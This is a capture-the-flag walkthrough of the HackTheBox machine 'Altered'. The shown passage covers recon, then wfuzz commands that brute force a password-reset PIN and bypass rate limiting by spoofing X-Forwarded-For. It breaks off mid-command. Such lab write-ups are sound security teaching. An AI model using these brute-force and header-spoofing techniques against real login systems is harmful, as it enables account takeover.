@@ -1,0 +1,786 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Altered</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-altered">htb-altered</a> <a class="post-tag" href="/tags#uhc">uhc</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#laravel">laravel</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#type-juggling">type-juggling</a> <a class="post-tag" href="/tags#password-reset">password-reset</a> <a class="post-tag" href="/tags#wfuzz">wfuzz</a> <a class="post-tag" href="/tags#bruteforce">bruteforce</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#rate-limit">rate-limit</a> <a class="post-tag" href="/tags#sqli">sqli</a> <a class="post-tag" href="/tags#sqli-file">sqli-file</a> <a class="post-tag" href="/tags#sqli-union">sqli-union</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-repeater">burp-repeater</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#dirtypipe">dirtypipe</a> <a class="post-tag" href="/tags#cve-2022-0847">cve-2022-0847</a> <a class="post-tag" href="/tags#pam-wordle">pam-wordle</a> <a class="post-tag" href="/tags#passwd">passwd</a> <a class="post-tag" href="/tags#ghidra">ghidra</a> <a class="post-tag" href="/tags#reverse-engineering">reverse-engineering</a> <a class="post-tag" href="/tags#htb-ransom">htb-ransom</a> </span><br/><br/>
+<time class="dt-published" datetime="2022-03-30T09:00:00+00:00" itemprop="datePublished">Mar 30, 2022
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2022/03/30/htb-altered.html" style="color: #e6e6e6; text-decoration: none;">HTB: Altered</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/altered-cover.webp" type="image/webp"/>
+<img alt="Altered" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/altered-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Altered was another Ultimate Hacking Championship (UHC) box that’s now up on HTB. This one has another Laravel website. This time I’ll abuse the password reset capability, bypassing the rate limiting using HTTP headers to brute force the pin. Once in, I’ll find a endpoint that’s vulnerable to SQL injection, but only after abusing type-juggling to bypass an integrity check. Using that SQL injection, I’ll write a webshell and get a foothold. To get to root, I’ll abuse Dirty Pipe, with a twist. Most of the scripts to exploit Dirty Pipe modify the passwd file, but this box has pam-wordle installed, so you much play a silly game of tech-based Wordle to auth. I’ll show both how to solve this, and how to use a different technique that overwrites a SUID executable. In Beyond Root, I’ll reverse how that latter exploit works.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/460 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/altered" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Altered</a> <a href="https://hackthebox.com/machines/altered" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-altered.webp" type="image/webp"/> <img alt="Altered" class="img-av" src="/icons/box-altered.png"/></picture></a><br/><a href="https://hackthebox.com/machines/altered" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">30 Mar 2022</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">30 Mar 2022</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/3769" rel="noopener" target="_blank"><img alt="ippsec" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/3769" style="display: unset"/><span class="user-text" style="display: none"> ippsec</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.159
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-30 10:27 UTC
+Nmap scan report for 10.10.11.159
+Host is up (0.021s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 8.95 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.159
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-30 10:28 UTC
+Nmap scan report for 10.10.11.159
+Host is up (0.019s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-title: UHC March Finals
+|_Requested resource was http://10.10.11.159/login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> version, the host is likely running Ubuntu 20.04 Focal.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site presents a login page for the UHC Staff Dashboard:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324104543740.webp" type="image/webp"/>
+<img alt="image-20220324104543740" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324104543740.png"/>
+</picture>
+<p>Trying admin / admin returns “Invalid Username”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324104558911.webp" type="image/webp"/>
+<img alt="image-20220324104558911" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324104558911.png"/>
+</picture>
+<p>Given that it says the page is for UHC qualified players, I’ll want to try with one of their names. There’s a page with the <a href="https://www.hackingesports.com.br/team-4?lang=en">UHC winners this season</a>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324104636225.webp" type="image/webp"/>
+<img alt="image-20220324104636225" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324104636225.png"/>
+</picture>
+<p>I’ll try big0us, and now it says invalid password:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324104708730.webp" type="image/webp"/>
+<img alt="image-20220324104708730" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324104708730.png"/>
+</picture>
+<p>I’ve found a way to validate users.</p>
+<p>On a failed login, a “Forgot Password?” button appears. Clicking that leads to <code class="language-plaintext highlighter-rouge">/reset</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324121113762.webp" type="image/webp"/>
+<img alt="image-20220324121113762" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324121113762.png"/>
+</picture>
+<p>If I enter a valid username, it says it emailed a pincode to me:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324121207291.webp" type="image/webp"/>
+<img alt="image-20220324121207291" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324121207291.png"/>
+</picture>
+<p>Guessing a pin shows the form again with an updated message:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324121429017.webp" type="image/webp"/>
+<img alt="image-20220324121429017" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324121429017.png"/>
+</picture>
+<p>That message indicates that the session cookie is important when submitting the pin.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>If I try visiting <code class="language-plaintext highlighter-rouge">/index.php</code>, it returns a redirect to <code class="language-plaintext highlighter-rouge">/index.php/login</code>. If I try <code class="language-plaintext highlighter-rouge">index.html</code>, it returns 404. This is a good indication that the site is running on PHP.</p>
+<p>The response headers show NGINX:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache, private</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 30 Mar 2022 13:14:29 GMT</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">http://10.10.11.159/login</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">XSRF-TOKEN=eyJpdiI6IjEvaE5oTjdualQrcG1PcUNodTNwUFE9PSIsInZhbHVlIjoiNFJDVzRJYWRDQVlCY3g5cG43WXM5SjlwLzF6QTFra2RTRVJTOWdnTkNPVC9aL1BhQmE2UVhCUzFKb0xYaXUxcTdMVmhXRFRQNU9UbE9VdmkxOWc5Wm1wRFNhNzFhOEt4NTNoVWQrK0Y4NXpiOTloMW5Zb0hVUnZ4N05NM2lwclgiLCJtYWMiOiI5OWZmNzdjZDdhOWU1OTNjMjczMTFmMmY5NDQzY2FmZDA3YmZhMGI2MGFmODNiMGM5MmRkOGU2NmUxMTc2MDA3IiwidGFnIjoiIn0%3D; expires=Wed, 30-Mar-2022 15:14:29 GMT; Max-Age=7200; path=/; samesite=lax</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">laravel_session=eyJpdiI6ImNMbzNvcitDclBuQWZSUUNFQnkzZEE9PSIsInZhbHVlIjoieVd0UUNRUlo5d1dwamRJZ3JRV1RFL0RqeHFkOVZ3MnpndE1DVVVCdS9tOHJOdDNVaGFyK1RjMTJkeGU5Ykp3WGtYRFFsT2M0S2gycEJITmYzcUxHcnFtOTZUT01tdWQ5aUQ5MlJPcGlaWWptODhxVjlxUWNoczUvVjVFOW0yd24iLCJtYWMiOiJiNjNkMWUyN2Q4N2ZjYzhkNjkxMjdjNTJlZjY2MGNjMmNkZDdiMDMxOTc1MmQ0ZmVhZGYyYWI1OTg2MGFmMzBmIiwidGFnIjoiIn0%3D; expires=Wed, 30-Mar-2022 15:14:29 GMT; Max-Age=7200; path=/; samesite=lax</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">346</span>
+
+...[snip]...
+</code></pre></div></div>
+<p>There’s also <code class="language-plaintext highlighter-rouge">laravel_session</code> cookies being set, which is a good indication that the site is PHP and built on the Laravel Framework. I showed a Laravel/PHP type juggling exploit in the previous UHC box, <a href="/2022/03/15/htb-ransom.html#bypass-login">Ransom</a>, and did a deep dive into Laravel in the <a href="/2022/03/15/htb-ransom.html#beyond-root">Beyond Root section</a> for that post. All of that is worth reading for good Laravel background.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.159 <span class="nt">-x</span> php
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.5.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.159
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.5.0
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.159/css =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.159/css/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        3w       11c http://10.10.11.159/test
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.159/js =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.159/js/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      140l      315w        0c http://10.10.11.159/login
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.159/css/lib =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.159/css/lib/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.159/js/lib =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.159/js/lib/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.159/fonts =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.159/fonts/</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET       12l       22w        0c http://10.10.11.159/index.php =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.159/index.php/login</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.159/js/lib/gmap =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.159/js/lib/gmap/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.159/js/init =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.159/js/init/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      133l      297w        0c http://10.10.11.159/reset
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 20m   479984/479984  0s      </span><span class="feroxbuster-green">found</span><span class="go">:11      </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 19m    59998/59998   50/s    http://10.10.11.159 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 19m    59998/59998   50/s    http://10.10.11.159/css 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 19m    59998/59998   50/s    http://10.10.11.159/js 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 19m    59998/59998   50/s    http://10.10.11.159/css/lib 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 19m    59998/59998   50/s    http://10.10.11.159/js/lib 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 19m    59998/59998   50/s    http://10.10.11.159/fonts 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 18m    59998/59998   53/s    http://10.10.11.159/js/lib/gmap 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 18m    59998/59998   53/s    http://10.10.11.159/js/init 
+</span></code></pre></div></div>
+<p>Nothing interesting there beyond what I already know.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="access-dashboard">Access Dashboard</h3>
+<h4 id="brute-force-pin---fail">Brute Force Pin - Fail</h4>
+<p>Given the pin is only four digits, I’ll try to brute force it with <code class="language-plaintext highlighter-rouge">wfuzz</code>. I’ll grab the cookies from my session and add them in. I’ll start this and quickly kill it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wfuzz <span class="nt">-u</span> http://10.10.11.159/api/resettoken <span class="se">\</span>
+<span class="go">&gt; -d "name=big0us&amp;pin=FUZZ" \
+&gt; -z range,0000-9999 \
+&gt; -H "Cookie: XSRF-TOKEN=eyJpdiI6IlZ2R1BUc1JURkdYVWJMNktDeFIwZFE9PSIsInZhbHVlIjoiN3FCSkZ4OHdsZEFqRDc4eEZSbnluM2t2S2FNL1RXa2ZzV2s0OGFRYVBOSFp6clhYWnRpRUZXUTFHdSs0dE1JVm5YYm92Z2xKQUpxRzdlOUlvTU9YRDcySXdhMDZZNVYwQWlHd0hXTXByUDNTZjZMMFFobXJ6VGRvdFNVWTNmOUYiLCJtYWMiOiIxYmEwYWNmYjJhNjdiY2I2YzMzZDVmNWJiZTk2MDAxZGU4Y2U0ZDU3MGJhNGVmMThjN2FmNDllNDQwNTk3YTNkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ilg0ckV2cEkzWFQwUmFLR0ZvRldPa2c9PSIsInZhbHVlIjoiWHdmOW1BVTlHTk11bEdJOGxhRVdZbjlKR25BbEo1S1ROSTNZYjFWblFuR0dnREl0WTIzRkE3WklzcUtNN2JjelQ3UytoazU5UmxoM0Zyc3ZxTW1ROS9vdzdMQXdQdVlSSUFUV0pPTTFBSmZaSS82RloxYkJUbWlCQ2lPaWJjMjUiLCJtYWMiOiJhMDJjNDkyMWVhYjc0MTI1ZTZmOTMxNTE2YTYzZWFjNjVjYzMwYzYwNTdiOTgyM2I5NjZjNmZiZWQ1OGM4OWRlIiwidGFnIjoiIn0%3D" \
+&gt; --hh 5341 \
+&gt; -w ips \
+&gt; -H "X-Originating-IP: FUZ2Z" \
+&gt; -m zip
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.159/api/resettoken
+Total requests: 10000
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000003:   200        140 L    324 W    5645 Ch     "0002 - 10.10.0.2"
+000000005:   200        140 L    324 W    5645 Ch     "0004 - 10.10.0.4"
+000000006:   200        140 L    324 W    5645 Ch     "0005 - 10.10.0.5"
+000000004:   200        140 L    324 W    5645 Ch     "0003 - 10.10.0.3"
+000000007:   200        140 L    324 W    5645 Ch     "0006 - 10.10.0.6"
+000000001:   200        140 L    324 W    5645 Ch     "0000 - 10.10.0.0"
+000000008:   200        140 L    324 W    5645 Ch     "0007 - 10.10.0.7"
+000000009:   200        140 L    324 W    5645 Ch     "0008 - 10.10.0.8"
+000000002:   200        140 L    324 W    5645 Ch     "0001 - 10.10.0.1"
+000000010:   200        140 L    324 W    5645 Ch     "0009 - 10.10.0.9"
+000000011:   200        140 L    324 W    5645 Ch     "0010 - 10.10.0.10"
+000000012:   200        140 L    324 W    5645 Ch     "0011 - 10.10.0.11"
+^C
+Finishing pending requests...
+</span></code></pre></div></div>
+<p>Looks like I need to hide the default case of 5645 characters. I’ll add <code class="language-plaintext highlighter-rouge">--hh 5645</code>. But there’s an issue that comes up. After about 60 requests, the response changes lengths, and becomes 429:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wfuzz <span class="nt">-u</span> http://10.10.11.159/api/resettoken <span class="nt">-d</span> <span class="s2">"name=big0us&amp;pin=FUZZ"</span> <span class="nt">-z</span> range,0000-9999 <span class="nt">-H</span> <span class="s1">'Cookie: XSRF-TOKEN=eyJpdiI6ImU3NEtGZUtKOGk5YWJTTFllWEtJRnc9PSIsInZh
+</span><span class="go">bHVlIjoibFZweDd4RVprZVp3ME9xbXZ4M2ZYbktDaEZGVkptVDlYUlVrUFlENkkvYjRlNVNXcXR4Q0NGa3hMNFhtUlRyUHU3cFR4YnFSWHM0RzdPSE12V0F2SjBMQzRzTmRsSHRUd0dObGc4QUxodVNsRFcveXROclFoQTQ1WndEZmdsK1EiLCJtYWMiOiIzMTgwODUyYTcwNTVjYjU
+xZDI5YTNmNTMzM2NkNWQ5ODY3OTg5Y2Q1NWY3NTE4MWFkYzY1MzNiMmMyOGY4N2VmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Iitla3R1Y0JVZTY0T1crTVZGSjkxeWc9PSIsInZhbHVlIjoiSXZMUVg4NXljbFliL3BwV2phYnJIQTRscVhWbU9wcE5QRGZmcmpQWj
+BIOGtVd3ZZOFpUSVhGRkRWRzBXMTVUM2VRUzRRSzZpclBZcW1IUmtyanQ3OVg4eG1JamdLYW16d0RNdkZFWnphK1krTTJZUTJ2YUxGMXBmbzFoUnBISnciLCJtYWMiOiI5OTVhMmQ2NDFiNzg1NDNlYTRkZTdmN2ZkNDY5OWMyOWVjYzEwNTdmMmM1NTE2OWNiMjk3MGI2ODE3ODFlY
+TdlIiwidGFnIjoiIn0%3D' --hh 5645
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.159/api/resettoken
+Total requests: 10000
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000061:   429        36 L     125 W    6625 Ch     "0060"
+000000063:   429        36 L     125 W    6625 Ch     "0062"
+000000064:   429        36 L     125 W    6625 Ch     "0063"
+000000062:   429        36 L     125 W    6625 Ch     "0061"
+000000065:   429        36 L     125 W    6625 Ch     "0064"
+000000066:   429        36 L     125 W    6625 Ch     "0065"
+...[snip]...
+</span></code></pre></div></div>
+<p>If I submit one manually now, it returns 429:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324124853028.webp" type="image/webp"/>
+<img alt="image-20220324124853028" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324124853028.png"/>
+</picture>
+<h4 id="rate-limit-bypass">Rate-Limit Bypass</h4>
+<p>HackTricks has a page on <a href="https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass">rate-limit bypass</a>, and one of the suggestions is to play with HTTP headers to trick the server into logging each request to a different IP. I need 10,000 different IPs (I could probably get away with 10,000 / 60, but I need 10,000 lines in the file I’m about to generate, so might as well make them unique). I’ll generate a file with enough IPs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>0..50<span class="o">}</span><span class="p">;</span> <span class="k">do</span>
+<span class="go">&gt; for j in {0..250}; do
+</span><span class="gp">&gt;   echo "10.10.$</span>i.<span class="nv">$j</span><span class="s2">";
+</span><span class="go">&gt; done; 
+&gt; done &gt; ips
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">wc</span> <span class="nt">-l</span> ips 
+<span class="go">12801 ips
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">head </span>ips
+<span class="go">10.10.0.0
+10.10.0.1
+10.10.0.2
+10.10.0.3
+10.10.0.4
+10.10.0.5
+10.10.0.6
+10.10.0.7
+10.10.0.8
+10.10.0.9
+</span></code></pre></div></div>
+<p>Now I’ll run the same <code class="language-plaintext highlighter-rouge">wfuzz</code> from before, but this time pass in the additional list, and use a second <code class="language-plaintext highlighter-rouge">FUZ2Z</code> parameter to show where to put it. I’m using <code class="language-plaintext highlighter-rouge">-m zip</code> to combine the two lists together. By default, with two fuzzes, it would try every combination. So for [a, b] and [c, d], it would try ac, ad, bc, bd. This is called product. By changing the method to zip, it will only pair things based on position in the list. So from the example above, it will try ac and bd. That makes sense here since I want a different IP for each number, not trying each number with each IP.</p>
+<p>It fails with <code class="language-plaintext highlighter-rouge">X-Originating-IP</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wfuzz <span class="nt">-u</span> http://10.10.11.159/api/resettoken <span class="se">\</span>
+<span class="go">&gt; -d "name=big0us&amp;pin=FUZZ" \
+&gt; -z range,0000-9999 \
+&gt; -H 'Cookie: XSRF-TOKEN=eyJpdiI6ImU3NEtGZUtKOGk5YWJTTFllWEtJRnc9PSIsInZhbHVlIjoibFZweDd4RVprZVp3ME9xbXZ4M2ZYbktDaEZGVkptVDlYUlVrUFlENkkvYjRlNVNXcXR4Q0NGa3hMNFhtUlRyUHU3cFR4YnFSWHM0RzdPSE12V0F2SjBMQzRzTmRsSHRUd0
+dObGc4QUxodVNsRFcveXROclFoQTQ1WndEZmdsK1EiLCJtYWMiOiIzMTgwODUyYTcwNTVjYjUxZDI5YTNmNTMzM2NkNWQ5ODY3OTg5Y2Q1NWY3NTE4MWFkYzY1MzNiMmMyOGY4N2VmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Iitla3R1Y0JVZTY0T1crTVZGSjkxe
+Wc9PSIsInZhbHVlIjoiSXZMUVg4NXljbFliL3BwV2phYnJIQTRscVhWbU9wcE5QRGZmcmpQWjBIOGtVd3ZZOFpUSVhGRkRWRzBXMTVUM2VRUzRRSzZpclBZcW1IUmtyanQ3OVg4eG1JamdLYW16d0RNdkZFWnphK1krTTJZUTJ2YUxGMXBmbzFoUnBISnciLCJtYWMiOiI5OTVhMmQ2
+NDFiNzg1NDNlYTRkZTdmN2ZkNDY5OWMyOWVjYzEwNTdmMmM1NTE2OWNiMjk3MGI2ODE3ODFlYTdlIiwidGFnIjoiIn0%3D' \
+&gt; --hh 5645 \
+&gt; -w ips \
+&gt; -H "X-Originating-IP: FUZ2Z" \
+&gt; -m zip
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.159/api/resettoken
+Total requests: 10000
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000061:   429        36 L     125 W    6625 Ch     "0000 - 10.10.0.60"
+000000064:   429        36 L     125 W    6625 Ch     "0000 - 10.10.0.63"
+000000062:   429        36 L     125 W    6625 Ch     "0000 - 10.10.0.61"
+000000063:   429        36 L     125 W    6625 Ch     "0000 - 10.10.0.62"
+...[snip]...
+</span></code></pre></div></div>
+<p>When I switch that to the second header on the HackTricks list, <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code>, it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wfuzz <span class="nt">-u</span> http://10.10.11.159/api/resettoken <span class="nt">-d</span> <span class="s2">"name=big0us&amp;pin=FUZZ"</span> <span class="nt">-z</span> range,0000-9999 <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6IlZ2R1BUc1JURkdYVWJMNktDeFIwZFE9PSIsInZhbHVlIjoiN3FCSkZ4OHdsZEFqRDc4eEZSbnluM2t2S2FNL1RXa2ZzV2s0OGFRYVBOSFp6clhYWnRpRUZXUTFHdSs0dE1JVm5YYm92Z2xKQUpxRzdlOUlvTU9YRDcySXdhMDZZNVYwQWlHd0hXTXByUDNTZjZMMFFobXJ6VGRvdFNVWTNmOUYiLCJtYWMiOiIxYmEwYWNmYjJhNjdiY2I2YzMzZDVmNWJiZTk2MDAxZGU4Y2U0ZDU3MGJhNGVmMThjN2FmNDllNDQwNTk3YTNkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ilg0ckV2cEkzWFQwUmFLR0ZvRldPa2c9PSIsInZhbHVlIjoiWHdmOW1BVTlHTk11bEdJOGxhRVdZbjlKR25BbEo1S1ROSTNZYjFWblFuR0dnREl0WTIzRkE3WklzcUtNN2JjelQ3UytoazU5UmxoM0Zyc3ZxTW1ROS9vdzdMQXdQdVlSSUFUV0pPTTFBSmZaSS82RloxYkJUbWlCQ2lPaWJjMjUiLCJtYWMiOiJhMDJjNDkyMWVhYjc0MTI1ZTZmOTMxNTE2YTYzZWFjNjVjYzMwYzYwNTdiOTgyM2I5NjZjNmZiZWQ1OGM4OWRlIiwidGFnIjoiIn0%3D"</span> <span class="nt">--hh</span> 5645 <span class="nt">-w</span> ips <span class="nt">-H</span> <span 